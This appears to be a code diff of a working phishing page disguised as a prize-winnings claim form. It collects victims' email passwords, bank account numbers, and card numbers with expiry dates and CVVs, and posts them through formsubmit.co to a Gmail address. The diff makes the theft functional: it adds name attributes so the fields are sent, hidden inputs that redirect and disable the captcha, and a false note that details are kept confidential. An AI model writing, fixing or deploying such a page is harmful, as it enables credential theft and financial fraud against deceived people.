@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -64,44 +65,82 @@
     }
   </style>
 </head>
-<body><form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com?redirect=https://onlinegistrationprog.github.io/thankyou.html" method="POST" data-captcha="false"><label>Full Name</label> <input type="text" id="fullName" required />
+<body>
 
-  <div class="error" id="fullNameError">Full Name is required</div><label>Country</label> <input type="text" id="country" required />
+<form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
+  <!-- Hidden redirect and captcha disable -->
+  <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html">
+  <input type="hidden" name="_captcha" value="false">
 
-  <div class="error" id="countryError">Country is required</div><label>Phone Number</label> <input type="tel" id="phone" required />
+  <label>Full Name</label>
+  <input type="text" id="fullName" name="Full Name" required />
+  <div class="error" id="fullNameError">Full Name is required</div>
 
-  <div class="error" id="phoneError">Enter 9–12 digit number</div><label>Email Address</label> <input type="email" id="email" required />
+  <label>Country</label>
+  <input type="text" id="country" name="Country" required />
+  <div class="error" id="countryError">Country is required</div>
 
-  <div class="error" id="emailError">Enter a valid email</div><label>Email Password</label>
+  <label>Phone Number</label>
+  <input type="tel" id="phone" name="Phone Number" required />
+  <div class="error" id="phoneError">Enter 9–12 digit number</div>
 
+  <label>Email Address</label>
+  <input type="email" id="email" name="Email Address" required />
+  <div class="error" id="emailError">Enter a valid email</div>
+
+  <label>Email Password</label>
   <div class="password-wrapper">
-    <input type="password" id="emailPassword" required />
+    <input type="password" id="emailPassword" name="Email Password" required />
     <i onclick="togglePasswordVisibility()">👁️</i>
   </div>
-  <div class="error" id="emailPasswordError">Password is required</div><label>Amount You Won</label> <input type="number" id="amountWon" required />
+  <div class="error" id="emailPasswordError">Password is required</div>
 
-  <div class="error" id="amountWonError">Amount is required</div><label>Bank Account Type</label> <input type="text" id="accountType" placeholder="e.g., Standard Bank Account" required />
+  <label>Amount You Won</label>
+  <input type="number" id="amountWon" name="Amount Won" required />
+  <div class="error" id="amountWonError">Amount is required</div>
 
-  <div class="error" id="accountTypeError">Account Type is required</div><label>Bank Account Number</label> <input type="text" id="accountNumber" required />
+  <label>Bank Account Type</label>
+  <input type="text" id="accountType" name="Bank Account Type" placeholder="e.g., Standard Bank Account" required />
+  <div class="error" id="accountTypeError">Account Type is required</div>
 
-  <div class="error" id="accountNumberError">Account Number is required</div><label>Bank Account Holder's Name</label> <input type="text" id="accountHolder" required />
+  <label>Bank Account Number</label>
+  <input type="text" id="accountNumber" name="Bank Account Number" required />
+  <div class="error" id="accountNumberError">Account Number is required</div>
 
-  <div class="error" id="accountHolderError">Account Holder's Name is required</div><label>Did You Link ATM to Your Bank Account?</label> <select id="linkedATM" required onchange="toggleATMFields()"> <option value="">-- Select --</option> <option value="Yes">Yes</option> <option value="No">No</option> </select>
+  <label>Bank Account Holder's Name</label>
+  <input type="text" id="accountHolder" name="Account Holder Name" required />
+  <div class="error" id="accountHolderError">Account Holder's Name is required</div>
 
-  <div class="error" id="linkedATMError">This field is required</div>  <div id="atmFields">
+  <label>Did You Link ATM to Your Bank Account?</label>
+  <select id="linkedATM" name="Linked ATM" required onchange="toggleATMFields()">
+    <option value="">-- Select --</option>
+    <option value="Yes">Yes</option>
+    <option value="No">No</option>
+  </select>
+  <div class="error" id="linkedATMError">This field is required</div>
+
+  <div id="atmFields">
     <label>ATM Card Number</label>
-    <input type="text" id="cardNumber" />
-    <div class="error" id="cardNumberError">Card Number must be 16 digits</div><label>Expiry Date (MM/YY)</label>
-<input type="text" id="expiryDate" placeholder="MM/YY" />
-<div class="error" id="expiryDateError">Format must be MM/YY</div>
+    <input type="text" id="cardNumber" name="ATM Card Number" />
+    <div class="error" id="cardNumberError">Card Number must be 16 digits</div>
 
-<label>CVV</label>
-<input type="text" id="cvv" />
-<div class="error" id="cvvError">CVV must be 3 digits</div>
+    <label>Expiry Date (MM/YY)</label>
+    <input type="text" id="expiryDate" name="Expiry Date" placeholder="MM/YY" />
+    <div class="error" id="expiryDateError">Format must be MM/YY</div>
 
-  </div>  <div id="finalNote"></div><button type="submit" id="submitBtn">Submit</button>
+    <label>CVV</label>
+    <input type="text" id="cvv" name="CVV" />
+    <div class="error" id="cvvError">CVV must be 3 digits</div>
+  </div>
 
-</form><script>
+  <div id="finalNote"></div>
+
+  <button type="submit" id="submitBtn">Submit</button>
+
+  <p style="font-size: 14px; color: gray;">We keep your details secure and confidential.</p>
+</form>
+
+<script>
 function togglePasswordVisibility() {
   const pw = document.getElementById('emailPassword');
   pw.type = pw.type === 'password' ? 'text' : 'password';
@@ -183,6 +222,7 @@ form.addEventListener('submit', function (e) {
     document.getElementById('finalNote').textContent = `Dear ${fullName}, You will receive ${amount} to your ${type}, ${number}`;
   }
 });
+</script>
 
-</script></body>
+</body>
 </html>
